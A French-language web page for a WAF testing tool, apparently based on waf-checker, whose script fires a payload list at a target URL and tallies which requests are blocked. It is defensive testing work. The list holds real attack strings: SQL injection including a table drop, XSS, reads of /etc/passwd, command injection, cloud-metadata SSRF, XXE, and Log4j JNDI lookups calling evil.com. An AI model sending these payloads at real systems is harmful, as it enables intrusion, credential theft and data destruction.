<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WAF Debug - Tests de Sécurité</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                        mono: ['JetBrains Mono', 'monospace'],
                    },
                    colors: {
                        dark: {
                            50: '#f8fafc', 100: '#f1f5f9', 200: '#e2e8f0', 300: '#cbd5e1',
                            400: '#94a3b8', 500: '#64748b', 600: '#475569', 700: '#334155',
                            800: '#1e293b', 900: '#0f172a', 950: '#020617',
                        },
                        accent: {
                            400: '#38bdf8', 500: '#0ea5e9', 600: '#0284c7', 700: '#0369a1',
                        }
                    }
                }
            }
        }
    </script>
    <style>
        body { font-family: 'Inter', sans-serif; }
        .font-mono { font-family: 'JetBrains Mono', monospace; }
        .glass { background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .glass-dark { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .scrollbar-thin::-webkit-scrollbar { width: 6px; height: 6px; }
        .scrollbar-thin::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); border-radius: 3px; }
        .scrollbar-thin::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 3px; }
        .status-200 { background: rgba(239, 68, 68, 0.2); color: #f87171; }
        .status-403 { background: rgba(34, 197, 94, 0.2); color: #4ade80; }
        .status-301 { background: rgba(251, 146, 60, 0.2); color: #fb923c; }
        .status-err { background: rgba(100, 116, 139, 0.2); color: #94a3b8; }
    </style>
</head>
<body class="bg-dark-950 min-h-screen text-dark-100">
    <!-- Navigation -->
    <nav class="glass-dark sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex items-center justify-between h-16">
                <div class="flex items-center gap-3">
                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-accent-500 to-accent-700 flex items-center justify-center shadow-lg">
                        <i class="fas fa-shield-halved text-white text-lg"></i>
                    </div>
                    <div>
                        <span class="text-lg font-semibold text-white">WAF Debug</span>
                        <span class="hidden sm:inline text-dark-400 text-sm ml-2">Security Testing Platform</span>
                    </div>
                </div>
                <div class="flex items-center gap-1">
                    <a href="/" class="px-4 py-2 rounded-lg text-sm font-medium text-dark-300 hover:text-white hover:bg-dark-800 transition-all">
                        <i class="fas fa-home mr-2"></i>Dashboard
                    </a>
                    <a href="/logs" class="px-4 py-2 rounded-lg text-sm font-medium text-dark-300 hover:text-white hover:bg-dark-800 transition-all">
                        <i class="fas fa-scroll mr-2"></i>Logs
                    </a>
                    <a href="/stats" class="px-4 py-2 rounded-lg text-sm font-medium text-dark-300 hover:text-white hover:bg-dark-800 transition-all">
                        <i class="fas fa-chart-bar mr-2"></i>Stats
                    </a>
                    <a href="/debug" class="px-4 py-2 rounded-lg text-sm font-medium text-dark-300 hover:text-white hover:bg-dark-800 transition-all">
                        <i class="fas fa-bug mr-2"></i>Debug
                    </a>
                    <a href="/tests" class="px-4 py-2 rounded-lg text-sm font-medium bg-accent-600 text-white">
                        <i class="fas fa-flask-vial mr-2"></i>Tests
                    </a>
                </div>
            </div>
        </div>
    </nav>

    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <!-- Header -->
        <div class="flex items-center gap-4 mb-8">
            <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-rose-500 to-rose-700 flex items-center justify-center shadow-xl">
                <i class="fas fa-flask-vial text-white text-xl"></i>
            </div>
            <div>
                <h1 class="text-2xl font-bold text-white">Tests de Sécurité WAF</h1>
                <p class="text-dark-400">Testez votre Web Application Firewall avec des payloads réels</p>
            </div>
        </div>

        <!-- Configuration -->
        <div class="glass rounded-xl overflow-hidden mb-6">
            <div class="px-6 py-4 border-b border-dark-700/50 flex items-center gap-3">
                <div class="w-10 h-10 rounded-lg bg-rose-500/20 flex items-center justify-center">
                    <i class="fas fa-cog text-rose-400"></i>
                </div>
                <div>
                    <h2 class="font-semibold text-white">Configuration des Tests</h2>
                    <p class="text-dark-400 text-sm">Définissez la cible et les paramètres</p>
                </div>
            </div>
            <div class="p-6 space-y-6">
                <!-- URL & Methods -->
                <div class="grid grid-cols-1 lg:grid-cols-12 gap-4">
                    <div class="lg:col-span-8">
                        <label class="block text-dark-400 text-sm mb-2 font-medium">URL Cible</label>
                        <input type="text" id="targetUrl" 
                            class="w-full bg-dark-800 text-white px-4 py-3 rounded-lg border border-dark-700 focus:border-accent-500 focus:outline-none font-mono text-sm"
                            placeholder="URL du site à tester">
                    </div>
                    <div class="lg:col-span-4">
                        <label class="block text-dark-400 text-sm mb-2 font-medium">Méthodes HTTP</label>
                        <div class="flex flex-wrap gap-2">
                            <label class="flex items-center gap-2 px-3 py-2 bg-dark-800 rounded-lg border border-dark-700 cursor-pointer hover:border-blue-500 transition-colors">
                                <input type="checkbox" class="method-checkbox accent-blue-500" value="GET" checked>
                                <span class="text-white text-sm font-medium">GET</span>
                            </label>
                            <label class="flex items-center gap-2 px-3 py-2 bg-dark-800 rounded-lg border border-dark-700 cursor-pointer hover:border-emerald-500 transition-colors">
                                <input type="checkbox" class="method-checkbox accent-emerald-500" value="POST" checked>
                                <span class="text-white text-sm font-medium">POST</span>
                            </label>
                            <label class="flex items-center gap-2 px-3 py-2 bg-dark-800 rounded-lg border border-dark-700 cursor-pointer hover:border-amber-500 transition-colors">
                                <input type="checkbox" class="method-checkbox accent-amber-500" value="PUT">
                                <span class="text-white text-sm font-medium">PUT</span>
                            </label>
                            <label class="flex items-center gap-2 px-3 py-2 bg-dark-800 rounded-lg border border-dark-700 cursor-pointer hover:border-rose-500 transition-colors">
                                <input type="checkbox" class="method-checkbox accent-rose-500" value="DELETE">
                                <span class="text-white text-sm font-medium">DELETE</span>
                            </label>
                        </div>
                    </div>
                </div>

                <!-- Categories -->
                <div>
                    <div class="flex items-center justify-between mb-3">
                        <label class="text-dark-400 text-sm font-medium">Catégories de Tests</label>
                        <div class="flex gap-2">
                            <button type="button" onclick="selectAllCategories()" class="text-xs px-3 py-1.5 bg-emerald-500/20 text-emerald-400 rounded-lg hover:bg-emerald-500/30 transition-colors font-medium">
                                <i class="fas fa-check-double mr-1"></i>Tout
                            </button>
                            <button type="button" onclick="deselectAllCategories()" class="text-xs px-3 py-1.5 bg-dark-700 text-dark-300 rounded-lg hover:bg-dark-600 transition-colors font-medium">
                                <i class="fas fa-times mr-1"></i>Aucun
                            </button>
                        </div>
                    </div>
                    <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-2" id="categories">
                        <!-- Categories will be inserted here -->
                    </div>
                </div>

                <!-- Actions -->
                <div class="flex gap-3">
                    <button onclick="runAllTests()" class="flex-1 bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white px-6 py-3 rounded-lg font-semibold transition-all flex items-center justify-center gap-2">
                        <i class="fas fa-play"></i>
                        <span>Lancer les Tests</span>
                    </button>
                    <button onclick="stopTests()" id="stopBtn" class="px-6 py-3 bg-dark-700 text-white rounded-lg font-semibold hover:bg-dark-600 transition-all hidden">
                        <i class="fas fa-stop mr-2"></i>Arrêter
                    </button>
                    <button onclick="clearResults()" class="px-6 py-3 bg-dark-700 text-dark-300 rounded-lg font-semibold hover:bg-dark-600 hover:text-white transition-all">
                        <i class="fas fa-trash mr-2"></i>Effacer
                    </button>
                </div>
            </div>
        </div>

        <!-- Legend -->
        <div class="glass rounded-xl p-4 mb-6">
            <div class="flex flex-wrap items-center gap-4 text-sm">
                <span class="text-dark-400 font-medium">Légende :</span>
                <div class="flex items-center gap-2">
                    <span class="px-2 py-1 status-200 rounded font-mono text-xs">2xx/5xx</span>
                    <span class="text-dark-300">WAF n'a pas bloqué</span>
                </div>
                <div class="flex items-center gap-2">
                    <span class="px-2 py-1 status-403 rounded font-mono text-xs">403</span>
                    <span class="text-dark-300">WAF a bloqué</span>
                </div>
                <div class="flex items-center gap-2">
                    <span class="px-2 py-1 status-301 rounded font-mono text-xs">3xx</span>
                    <span class="text-dark-300">Redirection</span>
                </div>
                <div class="flex items-center gap-2">
                    <span class="px-2 py-1 status-err rounded font-mono text-xs">ERR</span>
                    <span class="text-dark-300">Erreur réseau</span>
                </div>
            </div>
        </div>

        <!-- Stats Cards -->
        <div class="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
            <div class="glass rounded-xl p-4">
                <div class="text-dark-400 text-xs mb-1 font-medium">Total</div>
                <div class="text-2xl font-bold text-white font-mono" id="stat-total">0</div>
            </div>
            <div class="glass rounded-xl p-4 border-l-2 border-rose-500">
                <div class="text-dark-400 text-xs mb-1 font-medium">Non bloqué (2xx)</div>
                <div class="text-2xl font-bold text-rose-400 font-mono" id="stat-200">0</div>
            </div>
            <div class="glass rounded-xl p-4 border-l-2 border-emerald-500">
                <div class="text-dark-400 text-xs mb-1 font-medium">Bloqué (403)</div>
                <div class="text-2xl font-bold text-emerald-400 font-mono" id="stat-403">0</div>
            </div>
            <div class="glass rounded-xl p-4 border-l-2 border-amber-500">
                <div class="text-dark-400 text-xs mb-1 font-medium">Redirect (3xx)</div>
                <div class="text-2xl font-bold text-amber-400 font-mono" id="stat-301">0</div>
            </div>
            <div class="glass rounded-xl p-4 border-l-2 border-dark-500">
                <div class="text-dark-400 text-xs mb-1 font-medium">Erreurs</div>
                <div class="text-2xl font-bold text-dark-400 font-mono" id="stat-err">0</div>
            </div>
        </div>

        <!-- Progress -->
        <div id="progressBar" class="glass rounded-xl p-4 mb-6 hidden">
            <div class="flex justify-between text-sm text-dark-400 mb-2">
                <span class="font-medium">Progression</span>
                <span id="progressText" class="font-mono">0 / 0</span>
            </div>
            <div class="w-full bg-dark-800 rounded-full h-2">
                <div id="progress" class="bg-gradient-to-r from-rose-500 to-rose-400 h-2 rounded-full transition-all" style="width: 0%"></div>
            </div>
        </div>

        <!-- Results Table -->
        <div class="glass rounded-xl overflow-hidden">
            <div class="px-6 py-4 border-b border-dark-700/50 flex items-center gap-3">
                <div class="w-10 h-10 rounded-lg bg-violet-500/20 flex items-center justify-center">
                    <i class="fas fa-table text-violet-400"></i>
                </div>
                <div>
                    <h2 class="font-semibold text-white">Résultats des Tests</h2>
                    <p class="text-dark-400 text-sm">Détails de chaque payload testé</p>
                </div>
            </div>
            <div class="overflow-x-auto">
                <table class="w-full">
                    <thead class="bg-dark-800/50">
                        <tr>
                            <th class="py-3 px-6 text-left text-dark-400 text-xs font-medium uppercase tracking-wider">Catégorie</th>
                            <th class="py-3 px-6 text-left text-dark-400 text-xs font-medium uppercase tracking-wider">Méthode</th>
                            <th class="py-3 px-6 text-left text-dark-400 text-xs font-medium uppercase tracking-wider">Status</th>
                            <th class="py-3 px-6 text-left text-dark-400 text-xs font-medium uppercase tracking-wider">Payload</th>
                        </tr>
                    </thead>
                    <tbody id="resultsTable" class="divide-y divide-dark-800">
                        <tr>
                            <td colspan="4" class="py-12 text-center text-dark-400">
                                <div class="w-16 h-16 rounded-2xl bg-dark-800 flex items-center justify-center mx-auto mb-4">
                                    <i class="fas fa-flask-vial text-dark-500 text-2xl"></i>
                                </div>
                                <p>Aucun résultat</p>
                                <p class="text-dark-500 text-sm mt-1">Lancez les tests pour commencer</p>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </main>

    <footer class="border-t border-dark-800 mt-12">
        <div class="max-w-7xl mx-auto px-4 py-6 flex items-center justify-between">
            <div class="flex items-center gap-2 text-dark-400 text-sm">
                <i class="fas fa-shield-halved text-accent-500"></i>
                <span>WAF Debug Platform</span>
            </div>
            <div class="text-dark-500 text-sm">
                Basé sur <a href="https://github.com/SecH0us3/waf-checker" target="_blank" class="text-accent-400 hover:underline">waf-checker</a>
            </div>
        </div>
    </footer>

    <script>
    // Payloads de test WAF
    const PAYLOADS = {
        'SQLi': [
            "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' OR 1=1#", "admin'--",
            "1' ORDER BY 1--", "1 UNION SELECT 1,2,3--", "' UNION SELECT NULL,NULL,NULL--",
            "'; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)#",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "'/**/OR/**/1=1--", "' OR 'x'='x", "'; DROP TABLE users--"
        ],
        'XSS': [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>", "<a href=javascript:alert('XSS')>click</a>",
            "<iframe src=javascript:alert('XSS')>", "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<SCRIPT>alert('XSS')</SCRIPT>", "javascript:alert('XSS')"
        ],
        'Path Traversal': [
            "../../../etc/passwd", "../../../../etc/passwd", "../../../../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini", "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "../../../etc/passwd%00",
            "....//....//....//etc/passwd"
        ],
        'Command Injection': [
            "; ls -la", "| ls -la", "& ls -la", "&& ls -la", "; cat /etc/passwd",
            "| cat /etc/passwd", "; id", "| whoami", "$(cat /etc/passwd)", "`id`",
            "%0a cat /etc/passwd", "; sleep 5"
        ],
        'SSRF': [
            "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
            "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd", "http://127.0.0.1:22/", "http://2130706433/"
        ],
        'NoSQLi': [
            '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
            '{"username":{"$ne":null},"password":{"$ne":null}}',
            '{"$or":[{},{}]}', '{"$where":"1==1"}'
        ],
        'LFI': [
            "php://filter/convert.base64-encode/resource=index.php",
            "/etc/passwd", "/proc/self/environ", "../../../../etc/passwd",
            "....//....//....//etc/passwd"
        ],
        'SSTI': [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}"
        ],
        'XXE': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>'
        ],
        'Open Redirect': [
            "//evil.com", "///evil.com", "http://evil.com", "/\\evil.com",
            "//evil.com/%2F..", "http://google.com@evil.com"
        ],
        'Sensitive Files': [
            ".git/config", ".env", "wp-config.php", "package.json",
            ".htaccess", "docker-compose.yml", "backup.sql"
        ],
        'Log4j': [
            "${jndi:ldap://evil.com/a}", "${jndi:rmi://evil.com/a}",
            "${${lower:j}ndi:ldap://evil.com/a}"
        ]
    };

    let results = [];
    let stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
    let isRunning = false;
    let shouldStop = false;

    // Init au chargement
    document.addEventListener('DOMContentLoaded', function() {
        document.getElementById('targetUrl').value = window.location.origin;
        generateCategories();
    });

    function generateCategories() {
        const container = document.getElementById('categories');
        container.innerHTML = '';
        
        Object.keys(PAYLOADS).forEach(category => {
            const count = PAYLOADS[category].length;
            const label = document.createElement('label');
            label.className = 'flex items-center gap-2 px-3 py-2 bg-dark-800 rounded-lg border border-dark-700 cursor-pointer hover:border-rose-500 transition-colors';
            label.innerHTML = `
                <input type="checkbox" class="category-checkbox accent-rose-500" value="${category}" checked>
                <span class="text-white text-sm">${category}</span>
                <span class="text-dark-500 text-xs">(${count})</span>
            `;
            container.appendChild(label);
        });
    }

    function selectAllCategories() {
        document.querySelectorAll('.category-checkbox').forEach(cb => cb.checked = true);
    }

    function deselectAllCategories() {
        document.querySelectorAll('.category-checkbox').forEach(cb => cb.checked = false);
    }

    async function runAllTests() {
        const targetUrl = document.getElementById('targetUrl').value.trim();
        if (!targetUrl) {
            alert('Veuillez entrer une URL cible');
            return;
        }

        const methods = Array.from(document.querySelectorAll('.method-checkbox:checked')).map(cb => cb.value);
        if (methods.length === 0) {
            alert('Veuillez sélectionner au moins une méthode HTTP');
            return;
        }

        const categories = Array.from(document.querySelectorAll('.category-checkbox:checked')).map(cb => cb.value);
        if (categories.length === 0) {
            alert('Veuillez sélectionner au moins une catégorie');
            return;
        }

        results = [];
        stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
        shouldStop = false;
        isRunning = true;

        document.getElementById('stopBtn').classList.remove('hidden');
        document.getElementById('progressBar').classList.remove('hidden');

        const tests = [];
        categories.forEach(category => {
            const payloads = PAYLOADS[category];
            methods.forEach(method => {
                payloads.forEach(payload => {
                    tests.push({ category, method, payload });
                });
            });
        });

        const total = tests.length;
        let completed = 0;

        for (let i = 0; i < tests.length; i += 5) {
            if (shouldStop) break;
            const batch = tests.slice(i, i + 5);
            await Promise.all(batch.map(test => runSingleTest(targetUrl, test)));
            completed += batch.length;
            updateProgress(completed, total);
        }

        isRunning = false;
        document.getElementById('stopBtn').classList.add('hidden');
        updateStats();
    }

    async function runSingleTest(baseUrl, { category, method, payload }) {
        try {
            let url = baseUrl;
            let options = {
                method: method,
                headers: { 'X-Vuln-Type': category.toLowerCase().replace(/\s+/g, '-') }
            };

            if (category === 'Sensitive Files') {
                url = `${baseUrl}/${payload}`;
            } else if (method === 'GET') {
                url = `${baseUrl}/?payload=${encodeURIComponent(payload)}`;
            } else {
                if (category === 'XXE') {
                    options.headers['Content-Type'] = 'application/xml';
                    options.body = payload;
                } else if (payload.startsWith('{')) {
                    options.headers['Content-Type'] = 'application/json';
                    options.body = payload;
                } else {
                    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                    options.body = `payload=${encodeURIComponent(payload)}`;
                }
            }

            const response = await fetch(url, options);
            const status = response.status;

            let statusLabel = status.toString();
            if (status >= 300 && status < 400) statusLabel = '301';
            else if (status === 403) statusLabel = '403';
            else if (status >= 200 && status < 300) statusLabel = '200';
            else statusLabel = 'ERR';

            results.push({
                category, method, status: statusLabel,
                payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : '')
            });

            stats.total++;
            stats[statusLabel] = (stats[statusLabel] || 0) + 1;
            updateTable();
            updateStats();

        } catch (error) {
            results.push({
                category, method, status: 'ERR',
                payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : '')
            });
            stats.total++;
            stats['err']++;
            updateTable();
            updateStats();
        }
    }

    function stopTests() {
        shouldStop = true;
        isRunning = false;
        document.getElementById('stopBtn').classList.add('hidden');
    }

    function clearResults() {
        results = [];
        stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
        updateTable();
        updateStats();
        document.getElementById('progressBar').classList.add('hidden');
    }

    function updateProgress(current, total) {
        document.getElementById('progress').style.width = (current / total * 100) + '%';
        document.getElementById('progressText').textContent = `${current} / ${total}`;
    }

    function updateTable() {
        const tbody = document.getElementById('resultsTable');
        if (results.length === 0) {
            tbody.innerHTML = `<tr><td colspan="4" class="py-12 text-center text-dark-400">
                <div class="w-16 h-16 rounded-2xl bg-dark-800 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-flask-vial text-dark-500 text-2xl"></i>
                </div>
                <p>Aucun résultat</p><p class="text-dark-500 text-sm mt-1">Lancez les tests pour commencer</p>
            </td></tr>`;
            return;
        }

        tbody.innerHTML = results.slice(-100).reverse().map(r => `
            <tr class="hover:bg-dark-800/50 transition-colors">
                <td class="py-3 px-6 text-white text-sm">${r.category}</td>
                <td class="py-3 px-6"><span class="px-2 py-1 rounded-lg text-xs font-mono font-medium ${getMethodColor(r.method)}">${r.method}</span></td>
                <td class="py-3 px-6"><span class="status-${r.status.toLowerCase()} px-2.5 py-1 rounded-lg font-mono text-xs font-medium">${r.status}</span></td>
                <td class="py-3 px-6 text-dark-300 font-mono text-xs break-all max-w-md">${escapeHtml(r.payload)}</td>
            </tr>
        `).join('');
    }

    function updateStats() {
        document.getElementById('stat-total').textContent = stats.total;
        document.getElementById('stat-200').textContent = stats['200'] || 0;
        document.getElementById('stat-403').textContent = stats['403'] || 0;
        document.getElementById('stat-301').textContent = stats['301'] || 0;
        document.getElementById('stat-err').textContent = stats['err'] || 0;
    }

    function getMethodColor(method) {
        const colors = {
            'GET': 'bg-blue-500/20 text-blue-400',
            'POST': 'bg-emerald-500/20 text-emerald-400',
            'PUT': 'bg-amber-500/20 text-amber-400',
            'DELETE': 'bg-rose-500/20 text-rose-400'
        };
        return colors[method] || 'bg-dark-600 text-dark-300';
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    </script>
</body>
</html>
